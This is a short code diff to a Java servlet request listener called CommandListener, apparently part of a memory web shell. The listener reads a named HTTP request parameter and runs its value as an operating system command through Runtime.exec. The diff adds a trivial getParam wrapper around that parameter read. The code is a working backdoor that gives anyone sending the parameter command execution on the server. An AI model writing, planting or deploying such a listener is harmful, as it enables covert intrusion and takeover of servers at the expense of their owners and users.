@@ -21,11 +21,15 @@ public class CommandListener implements ServletRequestListener {
 
     }
 
+    public String getParam(String param) {
+        return param;
+    }
+
     @Override
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
         try {
-            String cmd = request.getParameter(paramName);
+            String cmd = getParam(request.getParameter(paramName));
             if (cmd != null) {
                 HttpServletResponse servletResponse = this.getResponseFromRequest(request);
                 Process exec = Runtime.getRuntime().exec(cmd);
